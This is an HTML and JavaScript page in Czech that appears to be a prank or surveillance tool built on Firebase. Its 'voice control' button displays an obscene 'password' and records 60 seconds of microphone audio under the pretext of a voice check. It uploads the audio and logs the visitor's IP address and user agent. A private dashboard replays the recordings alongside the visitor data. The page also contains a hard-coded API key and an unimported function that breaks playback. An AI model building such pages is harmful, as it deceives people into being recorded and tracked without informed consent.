<!DOCTYPE html>
<html lang="cs">
<head>
  <meta charset="UTF-8" />
  <title>s33yuh dashboard</title>
  <style>
    body {
      background: black;
      color: white;
      font-family: monospace;
      padding: 20px;
    }
    .visit {
      border-bottom: 1px solid #333;
      padding: 10px 0;
      margin-bottom: 10px;
    }
    audio {
      margin-top: 8px;
      width: 100%;
    }
    #login {
      display: flex;
      flex-direction: column;
      max-width: 300px;
      margin: 100px auto;
    }
    input {
      padding: 8px;
      margin: 5px 0;
      font-family: monospace;
    }
    button {
      padding: 10px;
      background: white;
      color: black;
      border: none;
      cursor: pointer;
    }
    #voiceControl {
      max-width: 300px;
      margin: 20px auto;
      text-align: center;
    }
    #passwordHint, #repeatPrompt {
      margin: 10px 0;
      font-weight: bold;
    }
    #repeatPrompt {
      display: none;
      color: orange;
    }
    #recordingStatus {
      margin-top: 10px;
      font-style: italic;
      color: lightgreen;
    }
  </style>
</head>
<body>
  <h1>s33yuh</h1>

  <div id="voiceControl">
    <div id="passwordHint">Heslo zní: <em>hoe suck a dick</em></div>
    <button id="startRecordingBtn">Hlasové ovládání</button>
    <div id="repeatPrompt">Opakujte heslo</div>
    <div id="recordingStatus"></div>
  </div>

  <div id="login">
    <input type="email" id="email" placeholder="Email" />
    <input type="password" id="password" placeholder="Heslo" />
    <button id="loginBtn">Přihlásit</button>
  </div>
  <div id="visits" style="display: none;"></div>

  <script type="module">
    import { initializeApp } from "https://www.gstatic.com/firebasejs/9.22.1/firebase-app.js";
    import { getDatabase, ref, onChildAdded } from "https://www.gstatic.com/firebasejs/9.22.1/firebase-database.js";
    import { getStorage, ref as storageRef, uploadBytes } from "https://www.gstatic.com/firebasejs/9.22.1/firebase-storage.js";
    import { getAuth, signInWithEmailAndPassword, onAuthStateChanged } from "https://www.gstatic.com/firebasejs/9.22.1/firebase-auth.js";

    const firebaseConfig = {
      apiKey: "AIzaSyB-RcliC7vlLVsR7arV0Z-Z2ywvFytvwOU",
      authDomain: "s33yuh-3cb81.firebaseapp.com",
      databaseURL: "https://s33yuh-3cb81-default-rtdb.europe-west1.firebasedatabase.app",
      projectId: "s33yuh-3cb81",
      storageBucket: "s33yuh-3cb81.appspot.com",
      messagingSenderId: "1004328351276",
      appId: "1:1004328351276:web:549a980def23a4112c8389"
    };

    const app = initializeApp(firebaseConfig);
    const db = getDatabase(app);
    const storage = getStorage(app);
    const auth = getAuth(app);

    const loginBox = document.getElementById('login');
    const visitsBox = document.getElementById('visits');

    // Přihlášení
    document.getElementById('loginBtn').addEventListener('click', async () => {
      const email = document.getElementById('email').value.trim();
      const password = document.getElementById('password').value.trim();
      try {
        await signInWithEmailAndPassword(auth, email, password);
      } catch (e) {
        alert("Nepodařilo se přihlásit.");
        console.error(e);
      }
    });

    onAuthStateChanged(auth, (user) => {
      if (user) {
        loginBox.style.display = 'none';
        visitsBox.style.display = 'block';
        loadVisits();
      } else {
        loginBox.style.display = 'flex';
        visitsBox.style.display = 'none';
      }
    });

    function loadVisits() {
      const visitsRef = ref(db, 'visits');
      onChildAdded(visitsRef, async (snapshot) => {
        const data = snapshot.val();
        const container = document.getElementById('visits');
        const div = document.createElement('div');
        div.className = 'visit';

        const ip = data.ip || 'neznámá';
        const city = data.city || 'neznámé město';
        const ua = data.userAgent || 'neznámý';
        const time = new Date(data.timestamp || 0).toLocaleString();

        let audioTag = '';
        const recordingsPath = `recordings/recording_${snapshot.key}.webm`;

        try {
          const url = await getDownloadURL(storageRef(storage, recordingsPath));
          audioTag = `<audio controls src="${url}"></audio>`;
        } catch (e) {
          audioTag = `<div style="color: gray;">(žádný záznam)</div>`;
        }

        div.innerHTML = `
          <div><strong>IP:</strong> ${ip}</div>
          <div><strong>Město:</strong> ${city}</div>
          <div><strong>User-Agent:</strong> ${ua}</div>
          <div><strong>Čas:</strong> ${time}</div>
          ${audioTag}
        `;

        container.prepend(div);
      });
    }

    // --- Nahrávání hlasu ---

    const startBtn = document.getElementById('startRecordingBtn');
    const repeatPrompt = document.getElementById('repeatPrompt');
    const recordingStatus = document.getElementById('recordingStatus');

    startBtn.addEventListener('click', async () => {
      startBtn.disabled = true;
      recordingStatus.textContent = "Čekám na povolení mikrofonu...";
      repeatPrompt.style.display = 'none';

      try {
        const stream = await navigator.mediaDevices.getUserMedia({ audio: true });
        recordingStatus.textContent = "Nahrávání...";
        
        const mediaRecorder = new MediaRecorder(stream);
        let chunks = [];

        mediaRecorder.ondataavailable = (e) => {
          if (e.data.size > 0) chunks.push(e.data);
        };

        mediaRecorder.start();

        // Náhodný čas 5-10s pro zobrazení výzvy "Opakujte heslo"
        const delay = Math.floor(Math.random() * 5000) + 5000;
        const promptTimeout = setTimeout(() => {
          repeatPrompt.style.display = 'block';
        }, delay);

        // Zastavit nahrávání po 60 sekundách
        setTimeout(() => {
          mediaRecorder.stop();
          repeatPrompt.style.display = 'none';
          recordingStatus.textContent = "Zpracovávám nahrávku...";
        }, 60000);

        mediaRecorder.onstop = async () => {
          clearTimeout(promptTimeout);
          recordingStatus.textContent = "Nahrávka dokončena, ukládám...";

          const blob = new Blob(chunks, { type: 'audio/webm' });

          // Unikátní název podle času + náhodné číslo (pro jistotu unikátnosti)
          const uniqueKey = Date.now() + '_' + Math.floor(Math.random() * 100000);
          const storagePath = `recordings/recording_${uniqueKey}.webm`;
          const storageReference = storageRef(storage, storagePath);

          try {
            await uploadBytes(storageReference, blob);

            // Do Realtime DB uložíme základní info + timestamp (bez IP atd. – to už máš ve visits)
            const visitRef = ref(db, 'visits/' + uniqueKey);
            await fetch('https://api.ipify.org?format=json') // načteme IP (jen pokud chceš, můžeš vynechat)
              .then(res => res.json())
              .then(async data => {
                const visitData = {
                  timestamp: Date.now(),
                  ip: data.ip || 'neznámá',
                  userAgent: navigator.userAgent,
                  city: 'neznámé město' // tady můžeš doplnit získání města podle IP, pokud chceš
                };
                // Uložíme data do Firebase DB (pokud chceš ukládat i info o nahrávce)
                await fetch(
                  `https://s33yuh-3cb81-default-rtdb.europe-west1.firebasedatabase.app/visits/${uniqueKey}.json`,
                  {
                    method: 'PUT',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify(visitData)
                  }
                );
              });

            recordingStatus.textContent = "Nahrávka úspěšně uložena.";
          } catch (err) {
            recordingStatus.textContent = "Chyba při ukládání nahrávky.";
            console.error(err);
          }

          startBtn.disabled = false;
        };
      } catch (e) {
        recordingStatus.textContent = "Přístup k mikrofonu zamítnut nebo chyba.";
        startBtn.disabled = false;
        console.error(e);
      }
    });
  </script>
</body>
</html>
